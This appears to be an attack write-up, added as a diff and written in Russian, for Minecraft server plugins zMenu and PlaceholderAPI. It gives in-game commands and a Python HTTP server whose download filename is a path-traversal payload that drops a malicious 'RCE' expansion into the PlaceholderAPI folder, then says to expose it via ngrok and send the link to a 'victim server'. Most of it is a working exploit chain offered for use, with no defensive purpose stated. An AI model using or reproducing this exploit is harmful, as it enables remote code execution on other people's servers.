@@ -1,0 +1,35 @@
+Плагин позволяет качать .yml файлы в любые директории
+делаем скрипт который при закачивании с ссылки меняет название файла на LFI Payload
+
+Пишем /zmenu download ссылка force
+/papi register copro.yml
+/papi parse me %rce_arg1_arg2%
+с версии 1.0.4.1 указанно что команда отключена, но по ошибке она по прежнему функционирует
+
+Скрипт на LFI-Payload
+На Windows: (Python)
+
+import http.server
+import socketserver
+
+PORT = 18080
+FILE_PATH = 'C:\RCEExpansion.yml'  # путь к вашему файлу
+DOWNLOAD_NAME = '../../../PlaceholderAPI/expansions/Stats-Expansion.yml'  # имя файла при скачивании
+
+class CustomHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/download.yml':
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/x-yaml')
+            self.send_header('Content-Disposition', f'attachment; filename="{DOWNLOAD_NAME}"')
+            self.end_headers()
+            with open(FILE_PATH, 'rb') as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_error(404)
+
+with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
+    print(f"Serving at port {PORT}")
+    httpd.serve_forever()
+
+Далее открываем порт через нгрок или другое говно и отсылаем серверу-жертве
